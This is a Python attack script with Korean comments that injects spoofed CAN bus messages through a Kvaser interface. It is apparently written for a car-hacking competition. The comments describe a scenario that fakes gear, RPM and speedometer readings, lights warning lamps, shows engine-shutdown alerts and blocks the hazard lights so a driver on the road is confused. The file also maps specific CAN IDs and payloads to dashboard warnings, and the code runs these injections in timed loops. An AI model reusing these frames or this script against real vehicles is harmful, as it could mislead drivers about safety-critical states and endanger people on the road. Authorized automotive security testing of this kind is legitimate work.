from Kvaser_Tx_Rx import Transmitter
import time

# if __name__ == '__main__':
# #     transmitter = Transmitter()
# #     transmitter.transmit_data(id=0x366, data='28 E2 FF 28 25 00 01',
# #                               interMsgTime=0.01, nMsg=300)
# #     # 초당 100개의 메시지를 3초간 전송 (메시지 주입 시 딜레이로 인해 약간의 시간차 발생 가능)


# 공격 시나리오 - 3
# 3. 계기판 내 모든 경고등 점등 공격
# • 초기요청상태(우리공격전주최측에요청할셋팅):기어 단수P or N
# • 초기상황(시나리오상 필요한 상황 가정) : 도로 위 주행 상태

# • 미션을 D 단으로 체결 후 RPM 값을 올리며 주행 상황을 만든다. TODO: 2ms 원래 20ms 10까지는 어느정도 가능
# • 이때, 시동이 곧 꺼진다는 문구가 등장하게 되면서 카운트 다운을 시작하고(실제 카운트 다운 가능)
#   시동이 꺼졌다는 화면(실제 시동이 꺼졌다는 화면 점등 가능)을 점등시킨다. TODO: 시동꺼짐 알림 원래(200)은 10 기어는 1 단위로 줄 수 있으면 좋다.
# # • 운전자는 비상등을 켜고 차량을 세우려고 할 것이다. (이때, 주최측에 깜빡이를 켜달라고 요청) TODO: 비상등 깜빡이 5ms
# # • 공격팀은 비상등이 들어오지 않도록 OFF 신호를 지속적으로 주입하여 비상등을 켤 수 없게 한다.
# # • 이때, 차량의 근접 및 안전 관련 센서들이 에러 또는 종료된다는 경고등을 반복적으로 주입하여,
#   운전자가 외부의 환경으로부터 보호받지 못하고 침착한 대응을 할 수 없도록 공격을 주입한다.
# TODO: RPM 세번째 필드값 6F 7번째 필드값이 01이 되면 안됨 5ms 주기로 주면 될듯 함.련


# 엔진오일 알림 367 두번쨰 0A
# 340 두번째 필드 핸들, 01, 11은 소리까지 81 또록 소리
# 340 00 00 00 FF FF FF FF FF FF 하이빔 보조시스템 점검
# 340 00 00 01 FF FF FF FF FF 0F 운전자 주의 경고 시스템
# 329 두번째 필드값 엔진 과열 알림 (엔진 온도가 올라감) D-까지 게이지 채우고 E-과열알림
# 381 파워 스티어링 휠 점검 데이터필드 모두 6
# 386 6번째 필드 속도조절 7번째필드 01이상이 되어야 함 라이트도 같이 켜진다. 데이터필드값 6,8번과도 연관있음
# 38D 모두 1일때
# 593 타이어 공기압 관
# 572 모든 필드 값 AA 변속기 위험 저장
# 568 가속페달 발을 떼시오 FF
# 553 모든 데이터 필드값 CC 시동 켜라는 알림
# 07F 1번필드 제동등, 3번필드 방향지시등 동시에가능 4번필드 전조등
# 4F! 전방안전 시스템 점검
# 50C 다 55 연료부족 알림 다 B로 넣었을때
# 563 후방카메라


# D 단 주입하면서 해당 공격상황 가능?
# rpm 어떤데이터 필드 값 건드려야 변경가능?
# 근접 안전 관련 센서 어떤것?

def attack_section(attack_list, num_msg_list, msg_delay_list, attack_time):
    transmitter = Transmitter()
    cur_num_list = list()
    attack_start = time.perf_counter()
    for i in range(len(attack_list)):
        cur_num_list.append(0)
    while time.perf_counter() < attack_start + attack_time:
        for i in range(len(attack_list)):
            msg_delay_list[i] = time.perf_counter() + msg_delay_list[i]
            if (cur_num_list[i] < num_msg_list[i]) and time.perf_counter() > msg_delay_list[i]:
                transmitter.transmit_data(attack_list[i][0], attack_list[i][1],
                                          attack_list[i][2], attack_list[i][3])
                cur_num_list[i] += 1


if __name__ == '__main__':

    # ============================= 메세지 갯수 조절

    attackMsg1 = 100
    attackMsg2 = 100
    attackMsg3 = 100

    # =============================

    transmitter = Transmitter()

    # ---------------------------------------------------------------------------
    # 1. D단 체결 메세지
    AttackTime = 100  # (초)
    numMsg1 = 100  # 전송할 메세지 갯수
    delay1 = 0.01  # 메세지 딜레이
    curMsg1 = 0
    AttackStart = time.perf_counter()

    while time.perf_counter() < AttackStart + AttackTime:

        # start = time.perf_counter()
        targetDelay = time.perf_counter() + delay1
        if (curMsg1 < numMsg1) and time.perf_counter() > targetDelay:
            transmitter.transmit_data(id=0x367, data='00 00 00 00 05 00 B4 12',
                                      interMsgTime=0, nMsg=1)
            curMsg1 += 1

    # --------------------------------------------------------------------------
    # 1. D단 체결 메세지
    # 2. RPM증가
    # 3. 속도계 조절

    AttackTime = 100  # (초)
    numMsg1 = 100  # 전송할 메세지 갯수
    numMsg2 = 100
    numMsg3 = 100
    delay1 = 0.01  # 메세지 딜레이
    delay2 = 0.02
    delay3 = 0.03
    curMsg1 = 0
    curMsg2 = 0
    curMsg3 = 0
    AttackStart = time.perf_counter()

    while time.perf_counter() < AttackStart + AttackTime:

        # start = time.perf_counter()
        # D 단 체결
        targetDelay = time.perf_counter() + delay1
        if (curMsg1 < numMsg1) and time.perf_counter() > targetDelay:
            transmitter.transmit_data(id=0x367, data='00 00 00 00 05 00 B4 12',
                                      interMsgTime=0, nMsg=1)
            curMsg1 += 1

        # start = time.perf_counter()
        # RPM 증가
        targetDelay = time.perf_counter() + delay2
        if (curMsg2 < numMsg2) and time.perf_counter() > targetDelay:
            transmitter.transmit_data(id=0x366, data='28 E2 FF 28 25 00 11',
                                      interMsgTime=0, nMsg=1)
            curMsg2 += 1

        # 속도계 증가
        targetDelay = time.perf_counter() + delay3
        if (curMsg3 < numMsg3) and time.perf_counter() > targetDelay:
            transmitter.transmit_data(id=0x386, data='00 00 00 00 00 33 01 02',
                                      interMsgTime=0, nMsg=1)
            curMsg3 += 1

    # --------------------------------------------------------------------------
    # 1. D단 체결 메세지
    # 2. RPM 증가
    # 3. 속도계 조절
    # 4. 시동꺼진다는 표시 3초

    attackList0 = list()
    attackNumList0 = list()
    attackDelayList0 = list()
    # id, data, interMsgTime, nMsg
    attackList0.append([0x367, '00 00 00 00 05 00 B4 12', 0, 1])
    attackNumList0.append(100)
    attackDelayList0.append(0.01)
    attackList0.append([0x366, '28 E2 FF 28 25 00 11', 0, 1])
    attackNumList0.append(100)
    attackDelayList0.append(0.01)
    attackList0.append([0x366, '28 E2 FF 28 25 00 11', 0, 1])
    attackNumList0.append(100)
    attackDelayList0.append(0.01)
    attackList0.append([0x386, '00 00 00 00 00 33 01 02', 0, 1])
    attackNumList0.append(100)
    attackDelayList0.append(0.01)

    attack_section(attackList0, attackNumList0, attackDelayList0, 1)

    # --------------------------------------------------------------------------
    # 1. D단 체결 메세지
    # 2. RPM 증가
    # 3. 속도계 조절
    # 4. 페달에서 발떼라는 경고

    attackList1 = list()
    attackNumList1 = list()
    attackDelayList1 = list()
    # id, data, interMsgTime, nMsg
    attackList1.append([0x367, '00 00 00 00 05 00 B4 12', 0, 1])
    attackNumList1.append(1000)
    attackDelayList1.append(0.002)
    attackList1.append([0x366, '28 E2 FF 28 25 00 11', 0, 1])
    attackNumList1.append(100)
    attackDelayList1.append(0.01)
    attackList1.append([0x366, '28 E2 FF 28 25 00 11', 0, 1])
    attackNumList1.append(100)
    attackDelayList1.append(0.01)
    attackList1.append([0x568, 'FF FF FF FF FF FF FF FF', 0, 1])
    attackNumList1.append(100)
    attackDelayList1.append(0.01)

    attack_section(attackList1, attackNumList1, attackDelayList1, 1)

    # --------------------------------------------------------------------------
    # 1. D단 체결 메세지
    # 2. 페달에서 발떼라는 경고

    attackList2 = list()
    attackNumList2 = list()
    attackDelayList2 = list()
    # id, data, interMsgTime, nMsg
    attackList2.append([0x367, '00 00 00 00 05 00 B4 12', 0, 1])
    attackNumList2.append(10000)
    attackDelayList2.append(0.002)
    attackList2.append([0x568, 'FF FF FF FF FF FF FF FF', 0, 1])
    attackNumList2.append(1000)
    attackDelayList2.append(0.01)

    attack_section(attackList2, attackNumList2, attackDelayList2, 10)

    # --------------------------------------------------------------------------
    # 1. D단 체결 메세지
    # 2. 시동 켜라는 안내 발생

    attackList3 = list()
    attackNumList3 = list()
    attackDelayList3 = list()
    # id, data, interMsgTime, nMsg
    attackList3.append([0x367, '00 00 00 00 05 00 B4 12', 0, 1])
    attackNumList3.append(10000)
    attackDelayList3.append(0.002)
    attackList3.append([0x553, 'CC CC CC CC CC CC CC CC', 0, 1])
    attackNumList3.append(1000)
    attackDelayList3.append(0.01)

    attack_section(attackList3, attackNumList3, attackDelayList3, 10)







